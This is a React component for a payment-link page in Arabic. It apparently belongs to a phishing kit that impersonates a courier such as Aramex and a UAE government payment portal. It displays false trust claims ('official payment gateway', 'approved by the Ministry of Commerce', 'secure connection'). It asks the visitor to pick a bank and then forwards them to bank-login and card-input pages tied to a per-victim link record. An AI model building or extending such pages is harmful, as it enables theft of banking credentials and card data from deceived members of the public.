import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, ArrowLeft, Loader2, Shield, CheckCircle, Lock } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);

  // Get country from link data
  const countryCode = linkData?.country_code || "";
  const countryData = getCountryByCode(countryCode);

  // Get preselected bank from link payload if available
  const preselectedBank = linkData?.payload?.selected_bank;

  // Get customer info from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  const shippingInfo = linkData?.payload as any;

  // Get amount from link data
  const rawAmount = shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, countryCode);

  // UAE Government Color Scheme
  const uaeColors = {
    primary: "#CE1126",
    secondary: "#00732F",
    accent: "#000000",
    background: "#FFFFFF",
    lightGray: "#F5F5F5",
    border: "#E0E0E0",
  };

  // Load banks when country is available from link data
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);

        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    }
  }, [countryCode, preselectedBank]);

  const handleBankSelect = (bankId: string) => {
    setSelectedBank(bankId);
  };

  const handleSkip = async () => {
    if (!linkData) return;

    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: 'skipped',
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
      console.error('Error saving bank selection:', error);
    }

    toast({
      title: "تم التخطي",
      description: "يمكنك إدخال بيانات البطاقة من أي بنك",
    });

    navigate(`/pay/${id}/card-input`);
  };

  const handleContinue = async () => {
    if (!selectedBank) {
      toast({
        title: "لم يتم اختيار بنك",
        description: "الرجاء اختيار بنك للمتابعة",
        variant: "destructive",
      });
      return;
    }

    if (!linkData) return;

    // Save selected bank to link for cross-device compatibility
    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: selectedBank,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });

      // Determine next action based on payment method
      navigate(`/pay/${id}/bank-login?bank=${selectedBank}`);
    } catch (error) {
      console.error('Error saving bank selection:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء حفظ اختيار البنك",
        variant: "destructive",
      });
    }
  };

  const selectedBankData = banks.find(b => b.id === selectedBank);

  return (
    <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
      {/* Header */}
      <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
                <Building2 className="w-6 h-6" style={{ color: uaeColors.primary }} />
              </div>
              <div className="text-white">
                <h1 className="text-lg font-bold">البوابة الرسمية للدفع</h1>
                <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
              </div>
            </div>
            <Badge variant="secondary" className="bg-white text-gray-800">
              <Lock className="w-3 h-3 ml-1" />
              اتصال آمن
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-3xl mx-auto">
          {/* Security Notice */}
          <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
            <div className="flex items-start gap-3">
              <Shield className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
              <div>
                <h3 className="font-semibold text-sm mb-1">اختيار البنك</h3>
                <p className="text-xs text-gray-600">
                  اختر البنك الذي تريد التحويل إليه. جميع البنوك تدعم الدفع الآمن
                </p>
              </div>
            </div>
          </div>

          <Card className="p-6 sm:p-8 shadow-lg border-0 rounded-lg overflow-hidden">
            <div className="mb-6">
              <div className="flex items-center gap-3 mb-2">
                <div
                  className="w-12 h-12 rounded-full flex items-center justify-center"
                  style={{ backgroundColor: `${uaeColors.primary}15` }}
                >
                  <Building2 className="w-6 h-6" style={{ color: uaeColors.primary }} />
                </div>
                <div>
                  <h3 className="text-lg font-bold" style={{ color: uaeColors.accent }}>
                    اختر البنك
                  </h3>
                  <p className="text-sm text-gray-500">اختر البنك الذي تريد التحويل إليه</p>
                </div>
              </div>
            </div>

            {/* Amount Display */}
            <div className="mb-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-600">المبلغ المطلوب دفعه</span>
                <span className="text-2xl font-bold" style={{ color: uaeColors.primary }}>{formattedAmount}</span>
              </div>
            </div>

            {/* Banks List */}
            <div className="space-y-3 mb-6">
              {loadingBanks ? (
                <div className="flex items-center justify-center py-12">
                  <Loader2 className="w-8 h-8 animate-spin" style={{ color: uaeColors.primary }} />
                </div>
              ) : banks.length > 0 ? (
                banks.map((bank) => (
                  <div
                    key={bank.id}
                    onClick={() => handleBankSelect(bank.id)}
                    className={`p-4 rounded-lg border-2 cursor-pointer transition-all hover:shadow-md ${
                      selectedBank === bank.id
                        ? 'border-opacity-100'
                        : 'border-opacity-50 hover:border-opacity-75'
                    }`}
                    style={{
                      borderColor: selectedBank === bank.id ? uaeColors.primary : uaeColors.border,
                      backgroundColor: selectedBank === bank.id ? `${uaeColors.primary}08` : uaeColors.background,
                    }}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <div
                          className="w-12 h-12 rounded-lg flex items-center justify-center"
                          style={{ backgroundColor: `${uaeColors.primary}15` }}
                        >
                          <Building2 className="w-6 h-6" style={{ color: uaeColors.primary }} />
                        </div>
                        <div>
                          <h4 className="font-bold text-base" style={{ color: uaeColors.accent }}>{bank.name}</h4>
                          <p className="text-sm text-gray-500">{bank.branchCode}</p>
                        </div>
                      </div>
                      {selectedBank === bank.id && (
                        <CheckCircle className="w-6 h-6" style={{ color: uaeColors.secondary }} />
                      )}
                    </div>
                  </div>
                ))
              ) : (
                <div className="text-center py-8">
                  <Building2 className="w-16 h-16 mx-auto text-gray-300 mb-4" />
                  <p className="text-gray-500">لا توجد بنوك متاحة في هذه الدولة</p>
                </div>
              )}
            </div>

            {/* Action Buttons */}
            <div className="flex gap-4">
              <Button
                variant="outline"
                onClick={handleSkip}
                className="flex-1 h-12 text-base"
              >
                تخطي
              </Button>
              <Button
                onClick={handleContinue}
                className="flex-1 h-12 text-base font-bold text-white transition-all hover:opacity-90"
                style={{ backgroundColor: uaeColors.primary }}
                disabled={!selectedBank}
              >
                <span className="ml-2">متابعة</span>
                <ArrowLeft className="w-5 h-5" />
              </Button>
            </div>

            <p className="text-xs text-center text-gray-500 mt-4">
              بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
            </p>
          </Card>

          {/* Security Footer */}
          <div className="mt-6 text-center">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
              <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
              <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>معتمد من وزارة التجارة</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentBankSelector;
